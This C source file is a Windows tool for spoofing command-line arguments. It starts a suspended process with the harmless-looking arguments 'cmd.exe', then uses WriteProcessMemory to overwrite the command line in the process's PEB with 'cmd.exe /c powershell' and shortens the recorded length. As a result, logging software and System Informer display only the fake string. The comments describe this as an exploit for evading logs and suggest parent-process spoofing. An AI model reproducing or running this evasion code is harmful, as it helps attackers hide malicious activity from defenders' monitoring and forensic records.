#include <Windows.h>
#include <stdio.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")

#define MAX_STR 32767

// Arguments that get displayed in the logs
// System Informer will display the most recent modification, so if that's a
// concern, set this to a substring of the real arguments
LPCWSTR FakeCommandLine = L"cmd.exe";
// Path to real executable
LPCWSTR NtImagePath = L"\\??\\C:\\Windows\\System32\\cmd.exe";
// Real options we start the command with
LPCWSTR RealCommandLine = L"cmd.exe /c powershell";

// We use this function to create a unicode string with a buffer big enough to store our real arguments
// This removes the length limitation in previous versions of the exploit, and since we pad with null bytes
// most logging software won't recognise that the string is longer than it seems
BOOL SupersizeUString(PUNICODE_STRING ustr, USHORT length, LPCWSTR initial) {
    if (length > MAX_STR) {
        printf("Length %d is too long to fit into a Windows unicode string (%d max).\n", length, MAX_STR);
        return FALSE;
    }
    
    // Make sure there's room for the null byte
    USHORT trueSize = length + sizeof(WCHAR);
    // Set up max length to be the size of the buffer
    ustr->Buffer = (PWSTR)malloc(trueSize);
    if (ustr->Buffer == NULL) {
        printf("Could not allocate memory for unicode string buffer.\n");
        return FALSE;
    }
    ustr->Length = trueSize - sizeof(WCHAR); // Leave room for null character
    ustr->MaximumLength = trueSize;
    // Ensure the whole buffer is 0s by default
    memset(ustr->Buffer, 0, trueSize);
    // Copy our original string in
    memcpy_s(ustr->Buffer, trueSize, initial, sizeof(WCHAR) * lstrlenW(initial));
    return TRUE;
}

int main(int argc, char** argv) {
    USHORT fakeCommandLineLength = lstrlenW(FakeCommandLine) * sizeof(WCHAR);
    USHORT realCommandLineLength = lstrlenW(RealCommandLine) * sizeof(WCHAR);
    // Get the length we should be setting the arguments string to (max of its two values)
    // Note that it doesn't appear we can increase this later even if the buffer is big
    // enough to allow us to
    USHORT highestLength = max(fakeCommandLineLength, realCommandLineLength);

    // Set up unicode strings
    UNICODE_STRING UFakeCommandLine;
    //RtlInitUnicodeString(&UFakeCommandLine, (PWSTR)FakeCommandLine);
    SupersizeUString(&UFakeCommandLine, highestLength, FakeCommandLine);
    UNICODE_STRING URealCommandLine;
    //RtlInitUnicodeString(&URealCommandLine, (PWSTR)RealCommandLine);
    SupersizeUString(&URealCommandLine, highestLength, RealCommandLine);

    printf("Real: %d %d %ls\n", URealCommandLine.Length, URealCommandLine.MaximumLength, URealCommandLine.Buffer);
    printf("Fake: %d %d %ls\n", UFakeCommandLine.Length, UFakeCommandLine.MaximumLength, UFakeCommandLine.Buffer);

    UNICODE_STRING UNtImagePath;
    RtlInitUnicodeString(&UNtImagePath, (PWSTR)NtImagePath);

    // Process parameters let us customise our process's configuration
    // We only need the ones that are defined
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    // Can we spoof image name too? Update: no, when calc is used here command prompt gets DNS errors, and when calc is used in the other place calc starts
    RtlCreateProcessParametersEx(&ProcessParameters, &UNtImagePath, NULL, NULL, &UFakeCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    // Initialize the PS_CREATE_INFO structure
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
    PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));

    // Initialize the PS_ATTRIBUTE_LIST structure
    // We use this to pass other important data to the new process
    // Just using it for the image name at the moment (this appears to be the main place it's important)
    // Is it possible to use PS_ATTRIBUTE_PARENT_PROCESS for PPID spoofing?
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
    AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
    AttributeList->Attributes[0].ValuePtr = clientId;

    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
    AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
    AttributeList->Attributes[1].ValuePtr = SecImgInfo;

    // Second usage of NtImagePath
    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[2].Size = UNtImagePath.Length;
    AttributeList->Attributes[2].ValuePtr = UNtImagePath.Buffer;

    AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
    AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
    AttributeList->Attributes[3].ValuePtr = stdHandleInfo;
    
    // Can be used for PPID spoofing if we have a handle to another process
    HANDLE hParent = GetCurrentProcess();
    if (hParent)
    {
        AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
        AttributeList->Attributes[4].Size = sizeof(HANDLE);
        AttributeList->Attributes[4].ValuePtr = hParent;
    }
    else
    {
        AttributeList->TotalLength -= sizeof(PS_ATTRIBUTE);
    }

    // Create the process
    // Make sure to start the thread suspended so we don't risk a race condition
    HANDLE hProcess, hThread = NULL;
    NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, &objAttr, &objAttr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);

    // Clean up
    // Free up the heap and destroy the parameters we don't need anymore
    RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
    RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
    RtlFreeHeap(RtlProcessHeap(), 0, clientId);
    RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
    RtlDestroyProcessParameters(ProcessParameters);


    // READ STARTUP INFO
    STARTUPINFOA si = { 0 };
    CONTEXT context;
    BOOL success;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD retLen;
    SIZE_T bytesRead, bytesWritten;
    PEB pebLocal;
    RTL_USER_PROCESS_PARAMETERS parameters = { sizeof(parameters) };

    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    // Read the PEB from the target process
    success = ReadProcessMemory(hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
    if (!success) {
        printf("Could not call ReadProcessMemory to grab PEB\n");
        return 1;
    }

    // Grab the ProcessParameters from PEB
    ReadProcessMemory(hProcess, pebLocal.ProcessParameters, &parameters, sizeof(parameters), &bytesRead);
    if (parameters.CommandLine.Buffer == NULL) {
        printf("Commandline arguments appear to be null?\n");
        return 1;
    }

    // Set the actual arguments we are looking to use
    // Hey look it's our buffer from earlier
    success = WriteProcessMemory(hProcess, parameters.CommandLine.Buffer, URealCommandLine.Buffer, URealCommandLine.Length, &bytesWritten);
    if (!success) {
        printf("Could not call WriteProcessMemory to update commandline args\n");
        return 1;
    }

    // This new value can only be smaller
    success = WriteProcessMemory(hProcess, (char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), (void*)&fakeCommandLineLength, 4, &bytesWritten);
    if (!success) {
        printf("Could not call WriteProcessMemory to update commandline arg length\n");
        return 1;
    }



    // Resume thread execution
    ResumeThread(hThread);


    // Secuirty
    system("pause");
}